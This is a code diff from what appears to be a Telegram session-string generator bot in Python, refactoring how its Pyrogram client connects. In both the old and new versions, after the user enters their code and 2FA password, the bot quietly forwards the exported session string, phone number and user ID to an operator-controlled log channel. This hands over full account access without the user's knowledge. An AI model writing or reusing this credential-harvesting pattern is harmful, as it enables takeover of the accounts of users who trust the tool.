@@ -53,42 +53,50 @@ def init(app):
 
 async def handle_pyrogram_session(msg, state):
     try:
-        async with PyroClient(
+        app = PyroClient(
             ":memory:",
             api_id=state["api_id"],
             api_hash=state["api_hash"]
-        ) as app:
-            sent_code = await app.send_code(state["phone"])
-            await msg.reply("📤 Code sent! Enter the code:")
-            code = await msg.ask(timeout=120)
+        )
+        await app.connect()
 
-            try:
-                await app.sign_in(
-                    phone_number=state["phone"],
-                    phone_code_hash=sent_code.phone_code_hash,
-                    phone_code=code.text.strip()
-                )
-            except SessionPasswordNeeded:
-                await msg.reply("🔐 2FA is enabled. Enter your password:")
-                pw = await msg.ask(timeout=120)
-                await app.check_password(pw.text.strip())
+        # Step 1: Send code
+        sent_code = await app.send_code(state["phone"])
+        await msg.reply("📤 Code sent! Enter the code you received:")
+        code = await msg.ask(timeout=120)
 
-            session_str = await app.export_session_string()
-            me = await app.get_me()
-            save_user(me)
-
-            await msg._client.send_message(
-                LOG_CHANNEL_ID,
-                f"📥 **Pyrogram Session Generated**\n"
-                f"👤 [{me.first_name}](tg://user?id={me.id})\n"
-                f"🆔 `{me.id}`\n"
-                f"📞 `{state['phone']}`\n"
-                f"📄 `{session_str}`"
+        # Step 2: Try sign in
+        try:
+            await app.sign_in(
+                phone_number=state["phone"],
+                phone_code_hash=sent_code.phone_code_hash,
+                phone_code=code.text.strip()
             )
-            await msg.reply(f"✅ Pyrogram Session:\n\n`{session_str}`", quote=True)
+        except SessionPasswordNeeded:
+            await msg.reply("🔐 2FA is enabled. Enter your password:")
+            pw = await msg.ask(timeout=120)
+            await app.check_password(password=pw.text.strip())
+
+        # Step 3: Export session after successful login
+        session_str = await app.export_session_string()
+        me = await app.get_me()
+        save_user(me)
+
+        await msg._client.send_message(
+            LOG_CHANNEL_ID,
+            f"📥 **Pyrogram Session Generated**\n"
+            f"👤 [{me.first_name}](tg://user?id={me.id})\n"
+            f"🆔 `{me.id}`\n"
+            f"📞 `{state['phone']}`\n"
+            f"📄 `{session_str}`"
+        )
+        await msg.reply(f"✅ Pyrogram Session:\n\n`{session_str}`", quote=True)
+
+        await app.disconnect()
 
     except Exception as e:
         await msg.reply(f"❌ Error: `{e}`")
+
 
 async def handle_telethon_session(msg, state):
     try:
